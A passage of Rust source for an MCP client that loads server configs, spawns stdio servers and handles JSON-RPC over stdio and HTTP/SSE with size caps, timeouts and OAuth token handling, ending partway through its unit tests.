                // A 401 mid-session means the token expired or was revoked.
                // Re-authorization fixes it, so don't disable the server — tell
                // the user where to re-auth.
                Err(RequestError::Unauthorized(_)) => Err(format!(
                    "MCP tool `{name}` needs authorization — its server returned 401; re-authorize it from /mcp"
                )),
                // Timeout / closed pipe / desync: the stream can't be trusted for
                // the next call. Disable the server and report it once.
                Err(RequestError::Transport(msg)) => {
                    server.dead.store(true, Ordering::Relaxed);
                    Err(format!(
                        "MCP server for `{name}` became unresponsive and was disabled for this session: {msg}"
                    ))
                }
            }
        })
    }
}

/// An `ExternalTools` view of a client minus the tools the user turned off in
/// `/mcp` (Ctrl+T). A filtered tool isn't advertised; a stray call to one (e.g.
/// replayed from stale history) is refused rather than routed.
pub struct FilteredTools {
    inner: Arc<dyn ExternalTools>,
    /// Qualified `mcp__server__tool` names — the advertised form, so no parsing.
    disabled: std::collections::HashSet<String>,
}

impl FilteredTools {
    pub fn new(inner: Arc<dyn ExternalTools>, disabled: std::collections::HashSet<String>) -> Self {
        Self { inner, disabled }
    }
}

impl ExternalTools for FilteredTools {
    fn specs(&self) -> Vec<Value> {
        self.inner
            .specs()
            .into_iter()
            .filter(|s| {
                s["function"]["name"]
                    .as_str()
                    .is_none_or(|n| !self.disabled.contains(n))
            })
            .collect()
    }

    fn handles(&self, name: &str) -> bool {
        self.inner.handles(name)
    }

    fn requires_approval(&self, name: &str) -> bool {
        // A disabled tool is refused in `call` without user involvement — a
        // permission card here could even persist an AlwaysAllow grant for it.
        !self.disabled.contains(name) && self.inner.requires_approval(name)
    }

    fn call<'a>(&'a self, name: &'a str, args: &'a Value) -> BoxFuture<'a, Result<String, String>> {
        if self.disabled.contains(name) {
            let msg = format!("MCP tool `{name}` is disabled — re-enable it in /mcp (Ctrl+T)");
            return Box::pin(async move { Err(msg) });
        }
        self.inner.call(name, args)
    }
}

/// Read the `mcpServers` config from the user file then the project dir (the
/// latter overrides on name collision). Returns the configs plus per-file parse
/// errors — a present-but-malformed mcp.json (a JSON typo) is reported, not
/// silently treated as "no servers". A missing file is not an error. `user_path`
/// is the user-global config (`None` in tests, to isolate from the real one).
fn load_configs(
    user_path: Option<&Path>,
    cwd: &Path,
) -> (HashMap<String, ServerConfig>, Vec<(String, String)>) {
    let mut configs = HashMap::new();
    let mut errors = Vec::new();
    let mut files: Vec<(PathBuf, String)> = Vec::new();
    // Packs first = lowest precedence; gated on user_path so `None` (tests) stays isolated.
    if user_path.is_some() {
        for dir in crate::agent::packs::mcp_dirs() {
            let label = format!("pack {}", dir.file_name().unwrap_or_default().display());
            files.push((dir.join(".mcp.json"), label));
        }
    }
    if let Some(path) = user_path {
        files.push((path.to_path_buf(), "~/.config/aivo/mcp.json".to_string()));
    }
    files.push((cwd.join(".mcp.json"), ".mcp.json".to_string()));
    for (path, label) in files {
        let Ok(text) = std::fs::read_to_string(&path) else {
            continue; // absent → fine
        };
        match parse_config(&text) {
            Ok(c) => configs.extend(c),
            Err(e) => errors.push((label, e)),
        }
    }
    (configs, errors)
}

/// Parse one config file. `Err` on a JSON syntax error (so it can be surfaced);
/// `Ok` (possibly empty) for valid JSON, even without an `mcpServers` key.
fn parse_config(text: &str) -> Result<HashMap<String, ServerConfig>, String> {
    let value: Value = serde_json::from_str(text).map_err(|e| format!("invalid JSON ({e})"))?;
    let mut out = HashMap::new();
    let Some(servers) = value.get("mcpServers").and_then(|s| s.as_object()) else {
        return Ok(out);
    };
    for (name, cfg) in servers {
        // A `command` is stdio; a `url` (without a command) is Streamable HTTP.
        // Anything with neither is skipped (e.g. a comment-only stub).
        let transport = if let Some(command) = cfg.get("command").and_then(|c| c.as_str()) {
            let args = cfg
                .get("args")
                .and_then(|a| a.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|x| x.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default();
            let env = cfg
                .get("env")
                .and_then(|e| e.as_object())
                .map(|e| {
                    e.iter()
                        .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                        .collect()
                })
                .unwrap_or_default();
            Transport::Stdio {
                command: command.to_string(),
                args,
                env,
            }
        } else if let Some(url) = cfg.get("url").and_then(|u| u.as_str()) {
            Transport::Http {
                url: url.to_string(),
                headers: parse_headers(cfg.get("headers")),
            }
        } else {
            continue;
        };
        let trust = cfg.get("trust").and_then(|t| t.as_bool()).unwrap_or(true);
        out.insert(name.clone(), ServerConfig { transport, trust });
    }
    Ok(out)
}

/// A config `headers` object → `(name, value)` pairs, dropping non-string values.
fn parse_headers(value: Option<&Value>) -> Vec<(String, String)> {
    value
        .and_then(|h| h.as_object())
        .map(|o| {
            o.iter()
                .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                .collect()
        })
        .unwrap_or_default()
}

/// Expand `${VAR}` / `${VAR:-default}` references in a config string from the
/// process environment. Applied at connect time, not parse time: the raw text
/// stays in the file and the UI, so secrets never render anywhere. An unset
/// variable without a default is an error naming the variable; `:-` also
/// substitutes when the variable is set but empty. `$VAR` without braces and an
/// unterminated `${` pass through literally.
pub fn expand_env_refs(s: &str) -> Result<String, String> {
    expand_env_refs_with(s, |name| std::env::var(name).ok())
}

fn expand_env_refs_with(
    s: &str,
    lookup: impl Fn(&str) -> Option<String>,
) -> Result<String, String> {
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(i) = rest.find("${") {
        out.push_str(&rest[..i]);
        let after = &rest[i + 2..];
        let Some(end) = after.find('}') else {
            out.push_str(&rest[i..]);
            return Ok(out);
        };
        let (name, default) = match after[..end].split_once(":-") {
            Some((n, d)) => (n, Some(d)),
            None => (&after[..end], None),
        };
        let value = lookup(name).filter(|v| !(v.is_empty() && default.is_some()));
        match (value, default) {
            (Some(v), _) => out.push_str(&v),
            (None, Some(d)) => out.push_str(d),
            (None, None) => {
                return Err(format!("environment variable ${{{name}}} is not set"));
            }
        }
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    Ok(out)
}

/// A copy of `cfg` with `${VAR}` references resolved in every value a server
/// actually receives: command, args, env values, url, header values.
fn expand_config(cfg: &ServerConfig) -> Result<ServerConfig, String> {
    let transport = match &cfg.transport {
        Transport::Stdio { command, args, env } => Transport::Stdio {
            command: expand_env_refs(command)?,
            args: args
                .iter()
                .map(|a| expand_env_refs(a))
                .collect::<Result<Vec<_>, _>>()?,
            env: env
                .iter()
                .map(|(k, v)| Ok((k.clone(), expand_env_refs(v)?)))
                .collect::<Result<HashMap<_, _>, String>>()?,
        },
        Transport::Http { url, headers } => Transport::Http {
            url: expand_env_refs(url)?,
            headers: headers
                .iter()
                .map(|(k, v)| Ok((k.clone(), expand_env_refs(v)?)))
                .collect::<Result<Vec<_>, String>>()?,
        },
    };
    Ok(ServerConfig {
        transport,
        trust: cfg.trust,
    })
}

/// A failed connect, carrying the human message plus whether the failure was a
/// `401` (so the caller records it as needs-auth, not a generic failure).
struct ConnectFailure {
    message: String,
    needs_auth: bool,
}

impl From<RequestError> for ConnectFailure {
    fn from(e: RequestError) -> Self {
        let needs_auth = matches!(e, RequestError::Unauthorized(_));
        ConnectFailure {
            message: e.into_message(),
            needs_auth,
        }
    }
}

impl From<String> for ConnectFailure {
    fn from(message: String) -> Self {
        ConnectFailure {
            message,
            needs_auth: false,
        }
    }
}

async fn connect_server(
    name: &str,
    cfg: &ServerConfig,
    handshake_timeout: Duration,
) -> Result<McpServer, ConnectFailure> {
    let cfg = expand_config(cfg)?;
    let (mut io, protocol_version) = match &cfg.transport {
        Transport::Stdio { command, args, env } => (
            ServerIo::Stdio(spawn_stdio(command, args, env)?),
            "2024-11-05",
        ),
        Transport::Http { url, headers } => {
            // Attach a stored OAuth bearer (refreshed if near expiry), so an
            // already-authorized server connects without re-prompting. A static
            // config `Authorization` header still wins if the user set one.
            let mut headers = headers.clone();
            if !headers
                .iter()
                .any(|(k, _)| k.eq_ignore_ascii_case("authorization"))
                && let Some(bearer) = resolve_http_bearer(name, url).await
            {
                headers.push(("Authorization".to_string(), bearer));
            }
            (
                ServerIo::Http(HttpIo::new(url, &headers)?),
                MCP_HTTP_PROTOCOL_VERSION,
            )
        }
    };

    io.request(
        "initialize",
        json!({
            "protocolVersion": protocol_version,
            "capabilities": {},
            "clientInfo": {"name": "aivo", "version": env!("CARGO_PKG_VERSION")}
        }),
        handshake_timeout,
    )
    .await?;
    io.notify("notifications/initialized").await?;
    let list = io
        .request("tools/list", json!({}), handshake_timeout)
        .await?;
    let tools = parse_tools(&list);

    Ok(McpServer {
        tools,
        io: Mutex::new(io),
        trust: cfg.trust,
        dead: AtomicBool::new(false),
    })
}

/// The `Authorization` value for an HTTP server from its stored OAuth
/// credential, refreshing in place (and persisting) when near expiry. `None`
/// when the server has never been authorized, OR when the stored credential was
/// issued for a different origin than `url` (a server re-pointed to a new host
/// under the same name must not receive the old host's token). A failed refresh
/// still returns the (stale) token — the server then answers 401 and the user
/// re-authorizes.
async fn resolve_http_bearer(name: &str, url: &str) -> Option<String> {
    use crate::services::{mcp_oauth, mcp_token_store};
    let mut cred = mcp_token_store::load(name).await?;
    // Never send a token to an endpoint other than the one it was authorized
    // for: a server re-pointed to a new host under the same name must not inherit
    // the old host's bearer.
    if !cred.applies_to(url) {
        return None;
    }
    if let Ok(true) =
        mcp_oauth::ensure_fresh(&mut cred, mcp_oauth::MCP_OAUTH_REFRESH_SKEW_SECS).await
    {
        let _ = mcp_token_store::save(name, &cred).await;
    }
    Some(cred.authorization_header())
}

/// Spawn a stdio MCP server, piping stdin/stdout and keeping the `Child` alive
/// (killed on drop). The child's stderr is discarded.
fn spawn_stdio(
    command: &str,
    args: &[String],
    env: &HashMap<String, String>,
) -> Result<StdioIo, String> {
    let try_spawn = |program: &str| {
        Command::new(program)
            .args(args)
            .envs(env)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .kill_on_drop(true)
            .spawn()
    };
    let spawned = try_spawn(command);
    // Windows: bare `npx`/`uvx` etc. are `.cmd`/`.bat` shims, and CreateProcess
    // only auto-appends `.exe` — retry with the batch extension (std then routes
    // through cmd.exe with safe quoting). Keep the original error if both fail.
    #[cfg(windows)]
    let spawned = match spawned {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => try_spawn(&format!("{command}.cmd"))
            .or_else(|_| try_spawn(&format!("{command}.bat")))
            .map_err(|_| e),
        other => other,
    };
    let mut child = spawned.map_err(|e| format!("spawn {command}: {e}"))?;
    let stdin = child.stdin.take().ok_or("no stdin")?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    Ok(StdioIo {
        stdin,
        stdout: BufReader::new(stdout),
        next_id: 1,
        _child: child,
    })
}

/// A failed `request`. A `Transport` error means the pipe is broken or the
/// response stream is desynced (a hung request's late reply would corrupt the
/// next call's read), so the server must be disabled. A `Protocol` error is a
/// well-formed JSON-RPC error from a healthy server — only this one call failed.
#[derive(Debug)]
enum RequestError {
    Transport(String),
    Protocol(String),
    /// An HTTP `401` from a Streamable HTTP server — it needs OAuth. Carries the
    /// `WWW-Authenticate` header (when present) for diagnostics; the user
    /// re-authorizes the server from `/mcp` rather than this being a hard failure.
    Unauthorized(Option<String>),
}

impl RequestError {
    fn into_message(self) -> String {
        match self {
            RequestError::Transport(m) | RequestError::Protocol(m) => m,
            RequestError::Unauthorized(Some(h)) => {
                format!("authorization required (HTTP 401): {h}")
            }
            RequestError::Unauthorized(None) => "authorization required (HTTP 401)".to_string(),
        }
    }
}

impl ServerIo {
    /// Send a JSON-RPC request and return its result, dispatching on transport.
    async fn request(
        &mut self,
        method: &str,
        params: Value,
        timeout: Duration,
    ) -> Result<Value, RequestError> {
        match self {
            ServerIo::Stdio(io) => stdio_request(io, method, params, timeout).await,
            ServerIo::Http(io) => http_request(io, method, params, timeout).await,
        }
    }

    /// Send a fire-and-forget JSON-RPC notification (no id, no response).
    async fn notify(&mut self, method: &str) -> Result<(), String> {
        match self {
            ServerIo::Stdio(io) => stdio_notify(io, method).await,
            ServerIo::Http(io) => http_notify(io, method).await,
        }
    }
}

/// Extract a JSON-RPC `result` from a parsed response, mapping a JSON-RPC `error`
/// to `Protocol`. Shared by both transports once a response object is in hand.
fn json_rpc_result(v: &Value) -> Result<Value, RequestError> {
    if let Some(err) = v.get("error") {
        return Err(RequestError::Protocol(
            err.get("message")
                .and_then(|m| m.as_str())
                .unwrap_or("MCP error")
                .to_string(),
        ));
    }
    Ok(v.get("result").cloned().unwrap_or(Value::Null))
}

/// Send a JSON-RPC request over stdio and read lines until the matching response
/// arrives, skipping interleaved notifications / other ids. Bounded three ways so
/// a buggy or hostile server can't hang or OOM us: each read has a `timeout`; each
/// line is size-capped (`read_line_bounded`); and we give up after
/// `MAX_SKIPPED_MESSAGES` unrelated lines — without the last, a server streaming
/// notifications faster than the timeout but never answering our id would loop
/// forever.
async fn stdio_request(
    io: &mut StdioIo,
    method: &str,
    params: Value,
    timeout: Duration,
) -> Result<Value, RequestError> {
    let id = io.next_id;
    io.next_id += 1;
    write_line(
        &mut io.stdin,
        &json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}),
    )
    .await
    .map_err(RequestError::Transport)?;
    for _ in 0..MAX_SKIPPED_MESSAGES {
        let Some(line) = read_line_bounded(&mut io.stdout, MCP_MAX_LINE_BYTES, timeout)
            .await
            .map_err(RequestError::Transport)?
        else {
            return Err(RequestError::Transport(
                "MCP server closed the connection".to_string(),
            ));
        };
        let Ok(v) = serde_json::from_str::<Value>(line.trim()) else {
            continue;
        };
        if v.get("id").and_then(|x| x.as_u64()) == Some(id) {
            return json_rpc_result(&v);
        }
    }
    Err(RequestError::Transport(format!(
        "MCP server sent {MAX_SKIPPED_MESSAGES} unrelated messages without answering `{method}`"
    )))
}

async fn stdio_notify(io: &mut StdioIo, method: &str) -> Result<(), String> {
    write_line(
        &mut io.stdin,
        &json!({"jsonrpc": "2.0", "method": method, "params": {}}),
    )
    .await
}

impl HttpIo {
    fn new(url: &str, headers: &[(String, String)]) -> Result<HttpIo, String> {
        validate_http_url(url)?;
        Ok(HttpIo {
            // Timeout 0 = no overall budget; each request wraps its own `timeout`
            // (an SSE response may legitimately stream for a while).
            client: crate::services::http_utils::router_http_client_with_timeout(0),
            endpoint: url.to_string(),
            headers: headers.to_vec(),
            session_id: None,
            next_id: 1,
        })
    }

    /// POST a JSON-RPC message, attaching the negotiated session id and any
    /// configured headers. Accepts both a single JSON reply and an SSE stream.
    async fn post(
        &self,
        body: &Value,
        timeout: Duration,
    ) -> Result<reqwest::Response, RequestError> {
        let mut req = self
            .client
            .post(&self.endpoint)
            .header(
                reqwest::header::ACCEPT,
                "application/json, text/event-stream",
            )
            .header(reqwest::header::CONTENT_TYPE, "application/json")
            .header("MCP-Protocol-Version", MCP_HTTP_PROTOCOL_VERSION)
            .json(body);
        if let Some(sid) = &self.session_id {
            req = req.header("Mcp-Session-Id", sid.as_str());
        }
        for (k, v) in &self.headers {
            req = req.header(k.as_str(), v.as_str());
        }
        tokio::time::timeout(timeout, req.send())
            .await
            .map_err(|_| RequestError::Transport("MCP HTTP request timed out".to_string()))?
            .map_err(|e| RequestError::Transport(format!("mcp http send: {e}")))
    }
}

/// Send a JSON-RPC request over Streamable HTTP, transparently recovering from an
/// expired session: a `404` on a request bearing an `Mcp-Session-Id` means the
/// server dropped the session (RFC: the client re-initializes), so we drop the
/// id, re-`initialize` a fresh session, and retry the request once.
async fn http_request(
    io: &mut HttpIo,
    method: &str,
    params: Value,
    timeout: Duration,
) -> Result<Value, RequestError> {
    if let Some(v) = http_request_once(io, method, &params, timeout).await? {
        return Ok(v);
    }
    // Session expired: re-establish one and retry the original request once.
    io.session_id = None;
    http_reinitialize(io, timeout).await?;
    http_request_once(io, method, &params, timeout)
        .await?
        .ok_or_else(|| {
            RequestError::Transport(
                "MCP session expired again immediately after re-initialize".to_string(),
            )
        })
}

/// One Streamable HTTP attempt. The server replies with either a single
/// `application/json` body or a `text/event-stream` SSE stream carrying the
/// response; both are handled, and the body is bounded. `Ok(None)` signals a
/// `404` on a request that carried a session id — the session lapsed and the
/// caller should re-initialize; every other failure is a normal `Err`.
async fn http_request_once(
    io: &mut HttpIo,
    method: &str,
    params: &Value,
    timeout: Duration,
) -> Result<Option<Value>, RequestError> {
    let id = io.next_id;
    io.next_id += 1;
    let body = json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params});
    let resp = io.post(&body, timeout).await?;

    // Capture the session id the server assigns at initialize, for later requests.
    if method == "initialize"
        && let Some(sid) = resp
            .headers()
            .get("mcp-session-id")
            .and_then(|v| v.to_str().ok())
    {
        io.session_id = Some(sid.to_string());
    }

    let status = resp.status();
    let content_type = resp
        .headers()
        .get(reqwest::header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_ascii_lowercase();

    // A 401 means the server wants OAuth — surface it distinctly (the user
    // authorizes it from `/mcp`) rather than as a hard transport failure.
    if status == reqwest::StatusCode::UNAUTHORIZED {
        let www = resp
            .headers()
            .get(reqwest::header::WWW_AUTHENTICATE)
            .and_then(|v| v.to_str().ok())
            .map(str::to_string);
        return Err(RequestError::Unauthorized(www));
    }

    // A 404 on a request carrying a session id = expired session → re-init+retry.
    if status == reqwest::StatusCode::NOT_FOUND && io.session_id.is_some() {
        return Ok(None);
    }

    if !status.is_success() {
        let code = status.as_u16();
        let snippet: String =
            read_body_capped(resp.bytes_stream(), MCP_HTTP_ERROR_SNIPPET_BYTES, timeout)
                .await
                .ok()
                .map(|b| String::from_utf8_lossy(&b).chars().take(300).collect())
                .unwrap_or_default();
        return Err(RequestError::Transport(if snippet.trim().is_empty() {
            format!("MCP server returned HTTP {code}")
        } else {
            format!("MCP server returned HTTP {code}: {snippet}")
        }));
    }

    if content_type.contains("text/event-stream") {
        read_sse_response(resp.bytes_stream(), id, timeout)
            .await
            .map(Some)
    } else {
        // application/json (or unlabeled) single JSON-RPC response, bounded.
        let bytes = read_body_capped(resp.bytes_stream(), MCP_MAX_HTTP_BODY_BYTES, timeout).await?;
        let v: Value = serde_json::from_slice(&bytes)
            .map_err(|e| RequestError::Transport(format!("mcp http response: {e}")))?;
        json_rpc_result(&v).map(Some)
    }
}

/// Re-establish a session after a `404`: `initialize` (which captures a fresh
/// `Mcp-Session-Id`) then the `notifications/initialized` notice. The discovered
/// tool set is kept — only the transport session is renewed.
async fn http_reinitialize(io: &mut HttpIo, timeout: Duration) -> Result<(), RequestError> {
    let init = json!({
        "protocolVersion": MCP_HTTP_PROTOCOL_VERSION,
        "capabilities": {},
        "clientInfo": {"name": "aivo", "version": env!("CARGO_PKG_VERSION")}
    });
    // session_id is None here, so a 404 on this attempt is a real Err (no loop).
    http_request_once(io, "initialize", &init, timeout)
        .await?
        .ok_or_else(|| RequestError::Transport("MCP re-initialize returned 404".to_string()))?;
    http_notify(io, "notifications/initialized")
        .await
        .map_err(RequestError::Transport)
}

/// Read a body (any byte-chunk stream) bounded to `max` bytes and `timeout` — so
/// a server can't OOM us with one giant `application/json` body (the SSE path is
/// already bounded). Errors as `Transport` when the cap or timeout is hit.
/// Generic over the stream so it's unit-testable with an in-memory one.
async fn read_body_capped<S, T, E>(
    stream: S,
    max: usize,
    timeout: Duration,
) -> Result<Vec<u8>, RequestError>
where
    S: futures::Stream<Item = Result<T, E>>,
    T: AsRef<[u8]>,
    E: std::fmt::Display,
{
    let read = async {
        let mut stream = std::pin::pin!(stream);
        let mut buf: Vec<u8> = Vec::new();
        while let Some(chunk) = stream.next().await {
            let chunk =
                chunk.map_err(|e| RequestError::Transport(format!("mcp http read: {e}")))?;
            let bytes = chunk.as_ref();
            if buf.len() + bytes.len() > max {
                return Err(RequestError::Transport(format!(
                    "MCP HTTP response exceeded {max} bytes"
                )));
            }
            buf.extend_from_slice(bytes);
        }
        Ok(buf)
    };
    tokio::time::timeout(timeout, read)
        .await
        .map_err(|_| RequestError::Transport("MCP HTTP response timed out".to_string()))?
}

async fn http_notify(io: &mut HttpIo, method: &str) -> Result<(), String> {
    let body = json!({"jsonrpc": "2.0", "method": method, "params": {}});
    // A notification has no id; the server should answer 202 Accepted with no
    // body. We don't read a response — just confirm the POST was delivered.
    io.post(&body, MCP_CALL_TIMEOUT)
        .await
        .map(|_| ())
        .map_err(RequestError::into_message)
}

/// Consume a `text/event-stream` SSE body (any stream of byte chunks), returning
/// the JSON-RPC response whose id matches `id`. Interleaved notifications / other
/// ids are skipped. Bounded the same three ways as the stdio reader: an overall
/// `timeout`, a total-byte cap (`MCP_MAX_HTTP_BODY_BYTES`), and `MAX_SKIPPED_MESSAGES`
/// unrelated events. Generic over the chunk stream so it's unit-testable with an
/// in-memory one.
async fn read_sse_response<S, T, E>(
    stream: S,
    id: u64,
    timeout: Duration,
) -> Result<Value, RequestError>
where
    S: futures::Stream<Item = Result<T, E>>,
    T: AsRef<[u8]>,
    E: std::fmt::Display,
{
    let read = async {
        let mut stream = std::pin::pin!(stream);
        let mut buf: Vec<u8> = Vec::new();
        let mut event_data = String::new();
        let mut total = 0usize;
        let mut skipped = 0usize;

        // Parse the accumulated `data:` payload of one SSE event; `Some(result)`
        // when it is the response we're waiting for, `None` to keep reading.
        let take_event = |data: &mut String,
                          skipped: &mut usize|
         -> Option<Result<Value, RequestError>> {
            let payload = std::mem::take(data);
            let trimmed = payload.trim();
            if trimmed.is_empty() {
                return None;
            }
            if let Ok(v) = serde_json::from_str::<Value>(trimmed)
                && v.get("id").and_then(|x| x.as_u64()) == Some(id)
            {
                return Some(json_rpc_result(&v));
            }
            *skipped += 1;
            if *skipped >= MAX_SKIPPED_MESSAGES {
                return Some(Err(RequestError::Transport(format!(
                    "MCP server sent {MAX_SKIPPED_MESSAGES} SSE events without answering id {id}"
                ))));
            }
            None
        };

        loop {
            let chunk = match stream.next().await {
                Some(Ok(bytes)) => bytes,
                Some(Err(e)) => {
                    return Err(RequestError::Transport(format!("mcp sse read: {e}")));
                }
                None => {
                    // Stream closed: flush a final event the server didn't
                    // terminate with a blank line, else report the break.
                    if let Some(done) = take_event(&mut event_data, &mut skipped) {
                        return done;
                    }
                    return Err(RequestError::Transport(
                        "MCP server closed the SSE stream without a response".to_string(),
                    ));
                }
            };
            let bytes = chunk.as_ref();
            total += bytes.len();
            if total > MCP_MAX_HTTP_BODY_BYTES {
                return Err(RequestError::Transport(format!(
                    "MCP SSE response exceeded {MCP_MAX_HTTP_BODY_BYTES} bytes"
                )));
            }
            buf.extend_from_slice(bytes);

            while let Some(nl) = buf.iter().position(|&b| b == b'\n') {
                let line_bytes: Vec<u8> = buf.drain(..=nl).collect();
                let line = String::from_utf8_lossy(&line_bytes);
                let line = line.trim_end_matches('\n').trim_end_matches('\r');
                if line.is_empty() {
                    // Event boundary.
                    if let Some(done) = take_event(&mut event_data, &mut skipped) {
                        return done;
                    }
                } else if let Some(rest) = line.strip_prefix("data:") {
                    // Per the SSE spec multiple `data:` lines join with newlines;
                    // a single leading space after the colon is stripped.
                    let rest = rest.strip_prefix(' ').unwrap_or(rest);
                    if !event_data.is_empty() {
                        event_data.push('\n');
                    }
                    event_data.push_str(rest);
                }
                // Other SSE fields (`event:`, `id:`, `retry:`, `:` comments) ignored.
            }
        }
    };

    tokio::time::timeout(timeout, read)
        .await
        .map_err(|_| RequestError::Transport("MCP SSE response timed out".to_string()))?
}

async fn write_line(stdin: &mut ChildStdin, msg: &Value) -> Result<(), String> {
    stdin
        .write_all(format!("{msg}\n").as_bytes())
        .await
        .map_err(|e| format!("mcp write: {e}"))?;
    stdin.flush().await.map_err(|e| format!("mcp flush: {e}"))
}

/// Read one newline-terminated line, bounded to `max` bytes AND `timeout` —
/// `read_line` has a time bound but no size bound, so a huge single response
/// (a big file read, an inline base64 image from a misbehaving server) would
/// buffer unbounded into memory before we'd ever cap the extracted text. Reads
/// chunk-at-a-time via `fill_buf` (efficient even for large legit lines).
/// `Ok(None)` at EOF (server closed). Generic over the reader so it's unit-
/// testable with an in-memory buffer.
async fn read_line_bounded<R: AsyncBufRead + Unpin>(
    reader: &mut R,
    max: usize,
    timeout: Duration,
) -> Result<Option<String>, String> {
    let read = async {
        let mut line: Vec<u8> = Vec::new();
        loop {
            let buf = reader
                .fill_buf()
                .await
                .map_err(|e| format!("mcp read: {e}"))?;
            if buf.is_empty() {
                return Ok(if line.is_empty() { None } else { Some(line) });
            }
            if let Some(nl) = buf.iter().position(|&b| b == b'\n') {
                line.extend_from_slice(&buf[..nl]); // drop the newline itself
                reader.consume(nl + 1);
                return Ok(Some(line));
            }
            let len = buf.len();
            if line.len() + len > max {
                return Err(format!("MCP response line exceeded {max} bytes"));
            }
            line.extend_from_slice(buf);
            reader.consume(len);
        }
    };
    let line: Option<Vec<u8>> = tokio::time::timeout(timeout, read)
        .await
        .map_err(|_| "MCP server timed out".to_string())??;
    Ok(line.map(|v| String::from_utf8_lossy(&v).into_owned()))
}

fn parse_tools(list: &Value) -> Vec<McpTool> {
    let Some(arr) = list.get("tools").and_then(|t| t.as_array()) else {
        return Vec::new();
    };
    let mut seen = std::collections::HashSet::new();
    arr.iter()
        .filter_map(|t| {
            let name = t.get("name")?.as_str()?.to_string();
            // Drop a duplicate tool name: two identical `mcp__server__tool`
            // function names in one request make the provider reject all of them.
            if !seen.insert(name.clone()) {
                return None;
            }
            Some(McpTool {
                name,
                description: t
                    .get("description")
                    .and_then(|d| d.as_str())
                    .unwrap_or("")
                    .to_string(),
                // Only accept an object schema. A server returning
                // `inputSchema: null` (or a non-object) would otherwise pass a
                // malformed `parameters` to the model — and since the tools array
                // rides on EVERY request, one bad schema would make the provider
                // reject all of them.
                input_schema: t
                    .get("inputSchema")
                    .filter(|v| v.is_object())
                    .cloned()
                    .unwrap_or_else(|| json!({"type": "object"})),
            })
        })
        .collect()
}

/// Concatenate the text parts of an MCP `tools/call` result; fall back to the raw
/// JSON when there's no text content (e.g. an image-only result). Capped like the
/// built-in tools (which all bound their output) so a server returning a huge blob
/// — a big file read, a giant diff — can't swamp the conversation context.
fn extract_text(result: &Value) -> String {
    let parts: Vec<&str> = result
        .get("content")
        .and_then(|c| c.as_array())
        .map(|arr| {
            arr.iter()
                .filter(|i| i.get("type").and_then(|t| t.as_str()) == Some("text"))
                .filter_map(|i| i.get("text").and_then(|t| t.as_str()))
                .collect()
        })
        .unwrap_or_default();
    let joined = if parts.is_empty() {
        result.to_string()
    } else {
        parts.join("\n")
    };
    cap_chars(&joined, MAX_MCP_RESULT_CHARS)
}

/// Truncate to `max` characters with a marker, doing only `O(max)` work (never
/// scanning a multi-MB result in full).
fn cap_chars(s: &str, max: usize) -> String {
    let mut out: String = s.chars().take(max).collect();
    if s.chars().nth(max).is_some() {
        out.push_str(&format!("\n… (MCP result truncated at {max} characters)"));
    }
    out
}

/// The function name advertised for an MCP tool, sanitized to what providers
/// accept (`[a-zA-Z0-9_-]`, ≤64 chars) — a server/tool name with a `.`, space,
/// or unicode would otherwise be an invalid function name and make the provider
/// reject the whole request. `lookup` reverses this by matching the same
/// computed name, so routing back to the real tool still works.
pub fn qualified_name(server: &str, tool: &str) -> String {
    sanitize_fn_name(&format!("mcp__{server}__{tool}"))
}

fn sanitize_fn_name(s: &str) -> String {
    let mut out: String = s
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
                c
            } else {
                '_'
            }
        })
        .collect();
    out.truncate(64); // all chars are now ASCII (1 byte) → a safe char boundary
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Destructure a stdio server config or panic — keeps the transport-aware
    /// assertions in the parse tests terse.
    fn stdio(cfg: &ServerConfig) -> (&str, &[String], &HashMap<String, String>) {
        match &cfg.transport {
            Transport::Stdio { command, args, env } => (command, args, env),
            Transport::Http { .. } => panic!("expected a stdio transport"),
        }
    }

    /// Destructure an HTTP server config or panic.
    fn http(cfg: &ServerConfig) -> (&str, &[(String, String)]) {
        match &cfg.transport {
            Transport::Http { url, headers } => (url, headers),
            Transport::Stdio { .. } => panic!("expected an http transport"),
        }
    }

    #[test]
    fn parse_config_reads_mcp_servers() {
        let cfg = parse_config(
            r#"{"mcpServers":{
                "fs":{"command":"npx","args":["-y","srv"],"env":{"K":"V"}},
                "risky":{"command":"x","trust":false}
            }}"#,
        )
        .unwrap();
        let (command, args, env) = stdio(cfg.get("fs").unwrap());
        assert_eq!(command, "npx");
        assert_eq!(args, ["-y", "srv"]);
        assert_eq!(env.get("K").map(String::as_str), Some("V"));
        assert!(cfg.get("fs").unwrap().trust, "default trust is true");
        assert!(
            !cfg.get("risky").unwrap().trust,
            "explicit trust:false honored"
        );
        // Valid JSON without an mcpServers key → Ok(empty), NOT an error.
        assert!(parse_config(r#"{"other":1}"#).unwrap().is_empty());
        // A JSON syntax error IS reported (so a typo'd mcp.json isn't silent).
        assert!(parse_config("{ not json").is_err());
    }

    #[test]
    fn env_ref_expansion() {
        let lk = |name: &str| match name {
            "TOK" => Some("secret".to_string()),
            "EMPTY" => Some(String::new()),
            _ => None,
        };
        assert_eq!(
            expand_env_refs_with("Bearer ${TOK}", lk).unwrap(),
            "Bearer secret"
        );
        assert_eq!(
            expand_env_refs_with("${TOK}/${TOK}", lk).unwrap(),
            "secret/secret"
        );
        assert_eq!(
            expand_env_refs_with("${MISSING:-dflt}", lk).unwrap(),
            "dflt"
        );
        // `:-` substitutes on set-but-empty; a plain ref keeps the empty value.
        assert_eq!(expand_env_refs_with("${EMPTY:-dflt}", lk).unwrap(), "dflt");
        assert_eq!(expand_env_refs_with("${EMPTY}", lk).unwrap(), "");
        // Bare `$VAR` and an unterminated `${` pass through literally.
        assert_eq!(expand_env_refs_with("$HOME/x", lk).unwrap(), "$HOME/x");
